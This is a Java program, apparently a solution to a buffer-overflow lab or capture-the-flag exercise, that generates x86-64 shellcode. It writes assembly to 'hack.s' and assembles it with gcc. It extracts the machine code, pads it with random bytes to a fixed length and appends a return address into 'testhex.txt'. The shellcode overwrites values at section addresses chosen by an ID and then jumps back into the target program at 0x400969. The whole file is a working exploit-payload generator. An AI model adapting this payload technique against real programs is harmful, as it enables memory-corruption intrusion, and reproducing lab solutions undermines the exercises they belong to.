import java.io.*;
import java.util.*;

public class Solver {

    private static final int NEEDED_LENGTH = 525;

    private static final String secA = "0x603cc0";
    private static final String secB = "0x602b80";
    private static String[] PRG = {".globl main",
				   "main:",
				   "pop %rbp",
				   "push %rax",
				   "push %rsi",
				   "push %rdi",
				   "mov $0x64, %rdi",
				   "mov $11, %rbx",
				   "sub $1, %rbx",
				   "mov $%SECTION, %rsi",
				   "mov $0, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "pop %rdi",
				   "pop %rsi",
				   "pop %rax",
				   "mov $0x400969, %rbx",
				   "jmp *%rbx",};
    
    public static void main(String[]args) throws Exception {
	if(args.length != 2) {
	    System.out.println("Use java Solver <section> <ID>");
	    System.exit(69);
	}
	String section = args[0].equalsIgnoreCase("A") ? secA : secB;
	int ID = Integer.parseInt(args[1]);

	BufferedWriter bw = new BufferedWriter(new FileWriter(new File("hack.s")));
	for(String line : PRG) {
	    String t = line.replaceAll("%SECTION", section).replaceAll("%OFFSET", ""+ID*4);
	    bw.write(t);
	    bw.write("\n");
	}
	bw.close();
	Process p = Runtime.getRuntime().exec("gcc -c -o hack.o hack.s");
	p.waitFor();

	DataInputStream dis = new DataInputStream(new FileInputStream(new File("hack.o")));

	DataOutputStream dos = new DataOutputStream(new FileOutputStream(new File("testhex.txt")));

	if(section == secA) dos.writeByte((byte)'A');
	else dos.writeByte((byte)'B');
	
	int start = 0x40;
	int len = 220;
	int curByte = 0;
	int readByte = 0;
	int bytes = 0;
	try {
	    while (true) {
		readByte = dis.readByte();
		if(curByte >= start && curByte <= start+len) {
		    if(readByte == 0x2e) break;
		    dos.writeByte((byte)(readByte&0xff));
		    bytes+=2;
		}
		curByte++;
	    }
	} catch(Exception e){}
	Random r = new Random();
	for(int i = 0; i <= (NEEDED_LENGTH-bytes)/2; i++) {
	    dos.writeByte((r.nextInt(10) *16) + r.nextInt(10));
	}
	dos.writeByte(0x01);
	dos.writeByte(0x20);
	dos.writeByte(0x60);
	dos.writeByte(0x0);
	dos.writeByte(0x0a);

	dos.close();
    }
}
